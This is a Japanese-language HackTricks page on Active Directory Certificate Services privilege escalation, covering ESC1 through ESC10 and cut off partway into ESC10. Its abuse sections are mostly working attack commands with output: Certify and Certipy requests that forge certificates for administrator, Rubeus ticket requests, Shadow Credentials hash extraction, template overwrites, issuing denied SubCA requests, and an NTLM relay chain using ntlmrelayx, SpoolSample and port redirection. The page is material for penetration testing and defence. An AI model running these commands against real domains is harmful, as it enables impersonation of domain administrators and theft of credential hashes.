# AD CS ドメイン権限昇格

{{#include ../../../banners/hacktricks-training.md}}


**これは以下の投稿の権限昇格手法セクションの要約です：**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 証明書テンプレートの誤設定 - ESC1

### 説明

### 証明書テンプレートの誤設定 - ESC1 の説明

- **Enterprise CA によって低権限ユーザーに enrolment 権限が付与されている。**
- **マネージャーの承認は不要である。**
- **承認された担当者の署名は不要である。**
- **証明書テンプレート上のセキュリティ記述子が過度に緩く、低権限ユーザーが enrolment 権限を取得できる。**
- **証明書テンプレートは認証を可能にする EKU を定義するように設定されている：**
- Extended Key Usage (EKU) の識別子として、Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0)、あるいは EKU がないもの（SubCA）などが含まれる。
- **テンプレートによって、リクエスターが Certificate Signing Request (CSR) に subjectAltName を含めることが許可されている：**
- Active Directory (AD) は、証明書に subjectAltName (SAN) が含まれている場合、識別の際にそれを優先する。つまり、CSR で SAN を指定すれば、任意のユーザー（例：ドメイン管理者）になりすました証明書を要求できるということだ。SAN をリクエスターが指定できるかは、証明書テンプレートの AD オブジェクトにある `mspki-certificate-name-flag` プロパティで示される。このプロパティはビットマスクであり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが存在するとリクエスターが SAN を指定できる。

> [!CAUTION]
> 上記の設定では低権限ユーザーが任意の SAN を持つ証明書を要求でき、Kerberos または SChannel を用いて任意のドメイン主体として認証できてしまう。

この機能は、製品やデプロイメントサービスが HTTPS やホスト証明書をオンザフライで生成するのをサポートするため、あるいは理解不足により有効化されていることがある。

このオプションで証明書を作成すると警告が出る点に注意が必要だが、既存の証明書テンプレート（例えば `WebServer` テンプレートのように `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効になっているもの）を複製して認証用の OID を追加した場合には同じ警告が出ないことがある。

### 悪用

脆弱な証明書テンプレートを**見つける**には、次を実行する：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
この**脆弱性を悪用して管理者になりすます**には、次を実行できます:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
その後、生成された**証明書を `.pfx` 形式に変換**し、それを用いて**Rubeus または certipy で再度認証**できます:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows バイナリ "Certreq.exe" と "Certutil.exe" は PFX を生成するために使用できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest の configuration schema 内の certificate templates の列挙は、特に承認や署名を必要とせず、Client Authentication または Smart Card Logon EKU を持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが有効なものについて、次の LDAP クエリを実行することで行えます:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 誤構成の証明書テンプレート - ESC2

### 説明

2番目の悪用シナリオは、最初のものの変形です:

1. Enterprise CA により、低権限のユーザーに証明書の登録権限が付与される。
2. マネージャーの承認要件が無効化されている。
3. 認可された署名の必要性が省略されている。
4. 証明書テンプレートのセキュリティ記述子が過度に許容的で、低権限のユーザーに証明書登録権限を与えている。
5. **証明書テンプレートが Any Purpose EKU を含む、または EKU を持たないように定義されている。**

**Any Purpose EKU** は、攻撃者がクライアント認証、サーバー認証、コード署名などを含む **あらゆる目的** のために証明書を取得できるようにする。**ESC3 で使用されたのと同じ手法** を利用してこのシナリオを悪用できる。

EKU のない証明書は下位 CA 証明書として機能し、**あらゆる目的** に悪用され得るし、**新しい証明書の署名にも使用できる**。したがって攻撃者は下位 CA 証明書を利用して、新しい証明書に任意の EKU やフィールドを指定できる。

ただし、下位 CA がデフォルト設定で信頼されている `NTAuthCertificates` オブジェクトにより信頼されていない場合、**ドメイン認証** 用に作成された新しい証明書は機能しない。それでも攻撃者は **任意のEKUを持つ新しい証明書** や任意の証明書値を作成することができる。これらは（例：コード署名、サーバー認証など）幅広い目的で潜在的に **悪用** され得て、SAML、AD FS、IPSec のようなネットワーク内の他のアプリケーションに重大な影響を及ぼす可能性がある。

AD フォレストの構成スキーマ内でこのシナリオに一致するテンプレートを列挙するには、次の LDAP クエリを実行できる:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### 説明

このシナリオは最初と2番目のものと似ていますが、**別の EKU**（Certificate Request Agent）と**2つの異なるテンプレート**を**悪用**する点が異なり、そのため要件が2セットあります。

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.

その**“enrollment agent”**はそのような**テンプレート**に登録し、取得した**証明書を用いて他のユーザの代理としてCSRに共署（co-sign）します**。次にその**共署済みCSR**をCAに**送信**し、CAは“他者の代理で登録（enroll on behalf of）”を許可する**テンプレート**への登録を行い、CAは“他の”ユーザに属する**証明書**を発行します。

**Requirements 1:**

- Enterprise CA によって低権限ユーザに登録権限が付与されている。
- マネージャ承認の要件が省略されている。
- 認可された署名の要件がない。
- 証明書テンプレートのセキュリティ記述子が過度に緩く、低権限ユーザに登録権限を付与している。
- その証明書テンプレートは Certificate Request Agent EKU を含み、他の主体の代理で他の証明書テンプレートを要求できるようになっている。

**Requirements 2:**

- Enterprise CA が低権限ユーザに登録権限を付与している。
- マネージャ承認がバイパスされる。
- テンプレートのスキーマバージョンが1であるか2を超えており、Certificate Request Agent EKU を必要とする Application Policy Issuance Requirement を指定している。
- 証明書テンプレートに定義された EKU のうち、ドメイン認証を許可するものがある。
- CA 上で enrollment agent に対する制限が適用されていない。

### Abuse

このシナリオを悪用するには [**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使用できます:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.

## 脆弱な証明書テンプレートのアクセス制御 - ESC4

### **説明**

The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.

Should an **attacker** possess the requisite **permissions** to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

- **Owner:** オブジェクトに対する暗黙の制御を付与し、任意の属性を変更することを可能にします。
- **FullControl:** オブジェクトに対する完全な権限を与え、任意の属性を変更する能力を含みます。
- **WriteOwner:** オブジェクトの所有者を攻撃者の管理下にあるプリンシパルに変更することを許可します。
- **WriteDacl:** アクセス制御を調整でき、攻撃者に FullControl を付与する可能性があります。
- **WriteProperty:** 任意のオブジェクトプロパティの編集を許可します。

### 悪用

To identify principals with edit rights on templates and other PKI objects, enumerate with Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
An example of a privesc like the previous one:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 は、ユーザーが証明書テンプレートに対して書き込み権限を持っている場合です。例えば、証明書テンプレートの設定を上書きしてテンプレートを ESC1 に対して脆弱にするよう悪用できます。

上のパスから分かるように、これらの権限を持っているのは `JOHNPC` のみですが、我々のユーザー `JOHN` は `JOHNPC` への新しい `AddKeyCredentialLink` エッジを持っています。この手法は証明書に関連しているため、私はこの攻撃も実装しました。これは [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) として知られています。以下は被害者の NT hash を取得する Certipy の `shadow auto` コマンドの簡単なプレビューです。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**は単一のコマンドで証明書テンプレートの設定を上書きできます。**デフォルト**では、Certipyは設定を**上書き**して**ESC1に脆弱**にします。また、**`-save-old` パラメータで古い設定を保存する**ことも指定でき、これは攻撃後に設定を**復元**するのに役立ちます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

ACL ベースの相互関係の広範なネットワークは、certificate templates や certificate authority を超える複数のオブジェクトを含み、AD CS システム全体のセキュリティに影響を及ぼす可能性があります。セキュリティに重大な影響を与え得るこれらのオブジェクトには、次が含まれます:

- S4U2Self や S4U2Proxy のようなメカニズムで侵害され得る、CA サーバーの AD コンピュータオブジェクト。
- CA サーバーの RPC/DCOM サーバー。
- 特定のコンテナパス `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` の配下にある任意の子孫 AD オブジェクトやコンテナ。このパスには、Certificate Templates container、Certification Authorities container、NTAuthCertificates オブジェクト、Enrollment Services Container など（これらに限定されない）が含まれます。

これらの重要コンポーネントのいずれかを低権限の攻撃者が掌握すると、PKI システムのセキュリティは損なわれます。

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

The subject discussed in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) also touches on the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag's implications, as outlined by Microsoft. This configuration, when activated on a Certification Authority (CA), permits the inclusion of **user-defined values** in the **subject alternative name** for **any request**, including those constructed from Active Directory®. Consequently, this provision allows an **intruder** to enroll through **any template** set up for domain **authentication**—specifically those open to **unprivileged** user enrollment, like the standard User template. As a result, a certificate can be secured, enabling the intruder to authenticate as a domain administrator or **any other active entity** within the domain.

**Note**: The approach for appending **alternative names** into a Certificate Signing Request (CSR), through the `-attrib "SAN:"` argument in `certreq.exe` (referred to as “Name Value Pairs”), presents a **contrast** from the exploitation strategy of SANs in ESC1. Here, the distinction lies in **how account information is encapsulated**—within a certificate attribute, rather than an extension.

### Abuse

To verify whether the setting is activated, organizations can utilize the following command with `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作は本質的に **remote registry access** を利用しているため、代替のアプローチは次のようになるかもしれません：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) と [**Certipy**](https://github.com/ly4k/Certipy) のようなツールは、この誤設定を検出して悪用できます:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**domain administrative** 権限または同等の権限を持っていることを前提に、任意のワークステーションから次のコマンドを実行できます:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
この設定を環境で無効にするには、flag を次のように削除します:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022年5月のセキュリティ更新以降、新たに発行される**証明書**には**セキュリティ拡張**が含まれ、その拡張は**要求者の `objectSid` プロパティ**を組み込みます。ESC1では、このSIDは指定された SAN から派生します。しかし、**ESC6**ではSIDはSANではなく**要求者の `objectSid`**を反映します。\
> ESC6を悪用するには、システムがESC10 (Weak Certificate Mappings) に脆弱であり、**新しいセキュリティ拡張よりもSANを優先する**必要があります。

## 脆弱な証明機関のアクセス制御 - ESC7

### 攻撃 1

#### 説明

証明機関のアクセス制御は、CAの操作を管理する一連の権限によって維持されます。これらの権限は、`certsrv.msc` を起動して CA を右クリックし、プロパティを選択してセキュリティタブに移動することで表示できます。さらに、PSPKI モジュールを使用して次のようなコマンドで権限を列挙することも可能です:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
これは主要な権限、すなわち **`ManageCA`** と **`ManageCertificates`** に関する洞察を提供し、それぞれ “CA 管理者” と “証明書マネージャー” の役割に対応します。

#### 悪用

証明書発行機関 (CA) に対して **`ManageCA`** 権限を持つと、主体は PSPKI を使ってリモートで設定を操作できます。これには **`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグを切り替えて任意のテンプレートで SAN の指定を許可することが含まれ、これはドメイン権限昇格の重要な要素です。

このプロセスは PSPKI の **Enable-PolicyModuleFlag** cmdlet を使用することで簡略化でき、GUI を直接操作せずに変更が可能になります。

**`ManageCertificates`** 権限を持つと、保留中のリクエストを承認でき、事実上「CA 証明書マネージャーの承認」保護策を回避できます。

A combination of **Certify** and **PSPKI** modules can be utilized to request, approve, and download a certificate:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### 説明

> [!WARNING]
> **前の攻撃**では **`Manage CA`** 権限を使用して **EDITF_ATTRIBUTESUBJECTALTNAME2** フラグを有効化し **ESC6 攻撃** を実行しましたが、CAサービス（`CertSvc`）を再起動するまでこれは効果を持ちません。ユーザーが `Manage CA` アクセス権を持っている場合、そのユーザーは **サービスを再起動する** ことも許可されます。しかし、**それがそのユーザーにサービスをリモートで再起動する権限を与えるわけではありません**。さらに、ほとんどのパッチ適用済み環境では、2022年5月のセキュリティ更新のために **ESC6はそのままでは動作しない場合があります**。

そこで、別の攻撃をここで紹介します。

前提条件:

- Only **`ManageCA` permission**
- **`Manage Certificates`** permission（**`ManageCA`** から付与可能）
- 証明書テンプレート **`SubCA`** は **有効化** されている必要がある（**`ManageCA`** から有効化可能）

この手法は、`Manage CA` および `Manage Certificates` アクセス権を持つユーザーが **失敗した証明書要求を発行できる** という事実に依存します。証明書テンプレート **`SubCA`** は **ESC1 に対して脆弱** ですが、テンプレートへ登録できるのは **管理者のみ** です。したがって、**ユーザー** は **`SubCA`** への登録を **要求** できます — これは **拒否** されます — が、その後マネージャーによって **発行される** ことになります。

#### 悪用

ユーザーを新しい担当者として追加することで、`Manage Certificates` のアクセス権を自分に付与できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** テンプレートは、`-enable-template` パラメータを使用して**CA 上で有効化**できます。デフォルトでは、`SubCA` テンプレートは有効になっています。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
この攻撃の前提条件を満たしていれば、**`SubCA` テンプレートに基づく証明書のリクエストを開始できます**。

**このリクエストは拒否されます**が、秘密鍵を保存し、リクエストIDを控えます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` and `Manage Certificates`** を持っていれば、`ca` コマンドと `-issue-request <request ID>` パラメータで、**失敗した証明書を発行**するリクエストを実行できます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最後に、`req` コマンドと `-retrieve <request ID>` パラメータを使用して、**発行された証明書を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### 攻撃 3 – Manage Certificates Extension Abuse (SetExtension)

#### 説明

古典的な ESC7 の悪用（EDITF 属性の有効化や保留中リクエストの承認）に加え、**Certify 2.0** は Enterprise CA 上で *Manage Certificates*（別名 **Certificate Manager / Officer**）ロールだけで実行できる新しいプリミティブを明らかにしました。

`ICertAdmin::SetExtension` RPC メソッドは *Manage Certificates* を持つ任意の主体によって実行できます。従来、このメソッドは正当な CA が **保留中** のリクエストの拡張を更新するために使用していましたが、攻撃者はこれを悪用して承認待ちのリクエストに対して **非デフォルトの証明書拡張**（例えば `1.1.1.1` のようなカスタムな *Certificate Issuance Policy* OID）を追記できます。

対象のテンプレートがその拡張のデフォルト値を**定義していない**場合、リクエストが最終的に発行されても CA は攻撃者が指定した値を上書きしません。結果として得られる証明書には攻撃者が選択した拡張が含まれ、これにより：

* 他の脆弱なテンプレートの Application / Issuance Policy 要件を満たし（権限昇格につながる）得る。
* 追加の EKU やポリシーを注入し、第三者システムに対して証明書に予期しない信頼を付与する可能性がある。

要するに、以前は ESC7 の「力の弱い」側と見なされていた *Manage Certificates* が、CA 設定に触れたり、より制限の厳しい *Manage CA* 権限を必要とすることなく、完全な権限昇格や長期的な持続性のために利用できるようになりました。

#### Certify 2.0 でこのプリミティブを悪用する手順

1. **保留状態（*pending*）のままになる証明書リクエストを送信する。** マネージャー承認を必要とするテンプレートを使うことでこれを強制できます：
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 新しい `manage-ca` コマンドを使って保留中のリクエストにカスタム拡張を追記する：
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*テンプレートが既に *Certificate Issuance Policies* 拡張を定義していない場合、上記の値は発行後も保持されます。*

3. リクエストを発行する（あなたのロールが *Manage Certificates* 承認権限も持っている場合）か、オペレータが承認するまで待ちます。発行されたら証明書をダウンロードします：
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成された証明書は悪意ある issuance-policy OID を含んでおり、以降の攻撃（例：ESC13、ドメイン昇格など）で使用できます。

> NOTE: 同じ攻撃は Certipy ≥ 4.7 の `ca` コマンドと `-set-extension` パラメータを使って実行できます。

## NTLM リレーから AD CS HTTP エンドポイントへの攻撃 – ESC8

### 説明

> [!TIP]
> **AD CS がインストールされている** 環境で、**脆弱な web enrollment endpoint** が存在し、かつ少なくとも 1 つの **certificate template が公開されており** そのテンプレートが **domain computer enrollment と client authentication** を許可している（例：デフォルトの **`Machine`** テンプレート）場合、**spooler サービスが有効な任意のコンピュータが攻撃者によって乗っ取られる可能性がある** ということになります！

AD CS は追加のサーバーロールとして管理者がインストールすることで利用可能になる、複数の **HTTP ベースの enrollment 方法** をサポートしています。これらの HTTP ベースの証明書登録用インターフェイスは **NTLM リレー攻撃** を受けやすいです。攻撃者は、**乗っ取ったマシンから、着信 NTLM によって認証する任意の AD アカウントをなりすます**ことができます。被害者アカウントになりすました状態で、攻撃者はこれらの Web インターフェイスにアクセスして、`User` や `Machine` 証明書テンプレートを用いてクライアント認証証明書を要求できます。

- **web enrollment interface**（古い ASP アプリケーションで `http://<caserver>/certsrv/` にある）はデフォルトで HTTP のみを使用しており、NTLM リレー攻撃に対する保護を提供しません。加えて、このインターフェイスは Authorization HTTP ヘッダを通じて明示的に NTLM のみを許可しており、Kerberos のようなより安全な認証方法は適用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、**Network Device Enrollment Service**（NDES）はデフォルトで Authorization HTTP ヘッダを介して negotiate 認証をサポートします。negotiate 認証は Kerberos と **NTLM の双方をサポートしており**、攻撃者はリレー攻撃中に認証を **NTLM にダウングレード** できます。これらの Web サービスはデフォルトで HTTPS を有効にしていますが、HTTPS 単体では **NTLM リレー攻撃から守れません**。HTTPS サービスに対する NTLM リレー攻撃の防護は、HTTPS と channel binding を組み合わせた場合にのみ可能です。残念ながら、AD CS は IIS 上で channel binding に必要な Extended Protection for Authentication を有効にしていません。

NTLM リレー攻撃に共通する **問題** の一つは、NTLM セッションの **短い有効期間** と、攻撃者が **NTLM signing を要求するサービス** と相互作用できないことです。

それでも、この制約は NTLM リレー攻撃を利用してユーザの証明書を取得することで克服できます。なぜなら証明書の有効期間がセッションの持続時間を決め、かつその証明書は **NTLM signing を必須とするサービス** に対しても使用できるからです。盗まれた証明書の利用方法については、次を参照してください：


{{#ref}}
account-persistence.md
{{#endref}}

NTLM リレー攻撃のもう一つの制約は、**攻撃者制御下のマシンが被害者アカウントによって認証される必要がある**ことです。攻撃者は待つか、あるいはこの認証を強制しようと試みることができます：


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **悪用**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` は **enabled HTTP AD CS endpoints** を列挙します:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、企業の証明機関（CAs）が Certificate Enrollment Service（CES）エンドポイントを保存するために使用されます。これらのエンドポイントは、ツール **Certutil.exe** を使用して解析および一覧化できます：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certifyを使った悪用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) を悪用する

Certipy による証明書の要求はデフォルトでテンプレート `Machine` または `User` に基づいて行われ、リレーされるアカウント名が末尾に `$` が付くかどうかで決まります。代替テンプレートは `-template` パラメータで指定できます。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam) のような手法を用いて認証を強制できます。ドメインコントローラーを扱う場合は、`-template DomainController` の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## セキュリティ拡張なし - ESC9 <a href="#id-5485" id="id-5485"></a>

### 説明

新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) は、**`msPKI-Enrollment-Flag`** のためのもので、ESC9と呼ばれ、証明書に**新しい `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張**を埋め込むことを防ぎます。このフラグは、`StrongCertificateBindingEnforcement` が `1`（デフォルト）に設定されている場合に関連性を持ち、`2` に設定されている場合とは対照的です。ESC9 がない場合でも要件は変わりませんが、Kerberos や Schannel の弱い証明書マッピングが悪用される可能性がある（ESC10 のような）シナリオでは、その重要性が増します。

このフラグの設定が重要になる条件は次のとおりです:

- `StrongCertificateBindingEnforcement` が `2` に調整されていない（デフォルトは `1`）か、または `CertificateMappingMethods` に `UPN` フラグが含まれている。
- 証明書が `msPKI-Enrollment-Flag` 設定内で `CT_FLAG_NO_SECURITY_EXTENSION` フラグでマークされている。
- 証明書で任意のクライアント認証 EKU が指定されている。
- 任意のアカウントに対して `GenericWrite` 権限があり、別のアカウントを侵害できる。

### 悪用シナリオ

例えば `John@corp.local` が `Jane@corp.local` に対して `GenericWrite` 権限を持っており、`Administrator@corp.local` を侵害することを目的としているとします。`Jane@corp.local` が登録できる `ESC9` 証明書テンプレートは、`msPKI-Enrollment-Flag` 設定で `CT_FLAG_NO_SECURITY_EXTENSION` フラグが設定されています。

最初に、`John` の `GenericWrite` により、Shadow Credentials を使用して `Jane` のハッシュが取得されます：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
その後、`Jane`の`userPrincipalName`は`Administrator`に変更され、意図的に`@corp.local`のドメイン部分が省かれています:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は、`Administrator@corp.local` が `Administrator` の `userPrincipalName` として区別されたままであるため、制約に違反しません。

続いて、脆弱とマークされた `ESC9` 証明書テンプレートが `Jane` として要求されます:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
証明書の `userPrincipalName` は `Administrator` を示しており、“object SID” は含まれていません。

`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
発行された証明書で認証を試行すると、現在 `Administrator@corp.local` の NT hash が取得されます。証明書にドメイン指定がないため、コマンドには `-domain <domain>` を含める必要があります:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### 説明

ESC10 が指すドメインコントローラ上の 2 つのレジストリキー値:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` の `CertificateMappingMethods` のデフォルト値は `0x18` (`0x8 | 0x10`)、以前は `0x1F` に設定されていました。
